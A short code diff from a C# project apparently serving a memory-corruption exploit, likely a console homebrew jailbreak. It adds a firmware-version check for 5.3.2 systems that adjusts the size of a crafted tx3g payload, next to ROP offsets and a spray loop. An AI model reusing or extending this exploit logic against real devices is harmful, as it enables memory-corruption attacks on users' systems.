@@ -9,7 +9,9 @@ namespace Offliine.Injection
         public static bool Serve(OutputStream output, SystemVersion version, string payloadName)
         {
             var tx3GSize = 32768;
-            //TODO(skettios): Add check for 5.3.2
+
+            if ((version == SystemVersions.Eu532) || (version == SystemVersions.Us532) || (version == SystemVersions.Jp532))
+                tx3GSize = 30720;
 
             var tx3GRopStart = tx3GSize - 2048;
             var payloadSourceAddr = 341237032;
@@ -95,7 +97,7 @@ namespace Offliine.Injection
             Util.WriteU32(1, payloadStream);
             Util.WriteU32((int) (4294967296L - tx3GSize), payloadStream);
 
-            for (int i = 0; i < 8192; i += 4)
+            for (var i = 0; i < 8192; i += 4)
                 Util.WriteU32(-2070567244, payloadStream);
 
             var payloadBytes = payloadStream.ToByteArray();
